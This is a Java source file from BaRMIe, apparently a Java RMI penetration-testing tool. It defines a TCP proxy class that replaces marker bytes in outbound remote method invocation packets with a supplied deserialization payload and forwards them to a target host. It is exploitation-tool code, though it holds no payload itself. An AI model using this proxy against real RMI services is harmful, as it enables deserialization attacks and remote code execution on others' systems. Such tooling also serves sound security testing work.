package nb.barmie.net.proxy;

import java.net.InetAddress;
import java.net.Socket;
import nb.barmie.net.proxy.thread.MethodCallPayloadInjectingProxyThread;
import nb.barmie.net.proxy.thread.PassThroughProxyThread;
import nb.barmie.util.ProgramOptions;

/***********************************************************
 * TCP proxy server used to proxy connections to remote
 * objects in order to inject deserialization payloads
 * into remote method invocation packets.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class RMIMethodCallProxy extends ProxyServer {
	/*******************
	 * Properties
	 ******************/
	private final byte[] _payload;	//The raw payload bytes to inject into remote method invocation packets
	private final byte[] _marker;	//The marker bytes to look for and replace in remote method invocation packets
	
	/*******************
	 * Construct the proxy.
	 * 
	 * @param targetHost The host to forward connections to.
	 * @param targetPort The port to forward connections to.
	 * @param options The program options.
	 * @param payload The raw bytes of the deserialization payload that will be injected into proxied method calls.
	 * @param marker The raw bytes of a marker object that will be replaced with the payload in proxied method calls.
	 ******************/
	public RMIMethodCallProxy(InetAddress targetHost, int targetPort, ProgramOptions options, byte[] payload, byte[] marker) {
		//Initialise super class
		super(targetHost, targetPort, options);
		
		//Store the payload and marker bytes
		this._payload = payload;
		this._marker = marker;
	}
	
	/*******************
	 * Create a proxy session object that looks for a given marker in outbound
	 * remote method invocation packets and replaces it with raw bytes of a
	 * deserialization payload.
	 * 
	 * @param clientSock A Socket for the incoming client connection.
	 * @param targetSock A Socket connected to the proxy target.
	 * @return A ProxySession object to handle the connection and data transfer.
	 ******************/
	protected ProxySession createProxySession(Socket clientSock, Socket targetSock) {
		return new ProxySession(
				new MethodCallPayloadInjectingProxyThread(clientSock, targetSock, this._payload, this._marker),
				new PassThroughProxyThread(targetSock, clientSock)
		);
	}
}
